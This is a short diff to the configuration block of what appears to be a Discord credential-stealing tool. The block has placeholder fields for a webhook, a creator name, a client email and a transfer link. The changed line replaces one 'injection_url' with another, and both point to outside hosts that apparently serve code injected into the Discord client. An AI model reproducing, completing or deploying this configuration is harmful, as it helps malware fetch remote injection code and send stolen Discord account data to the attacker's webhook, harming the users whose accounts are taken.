@@ -22,7 +22,7 @@ var config = {
   mail: "%CLIENTEMAIL%",
   creator: "%NAME_CREATOR%",
   transfer_link: `%TRANSFER_URL%`,
-  injection_url: "https://raw.6889.fun/api/aurathemes/p/inject/dc?aurathemes=true",
+  injection_url: "https://6889-fun.vercel.app/api/aurathemes/injects/premium/discord?aurathemes=true",
   webhook: "%WEBHOOK%",
   Placed: "%API_URL%",
   Filter: {
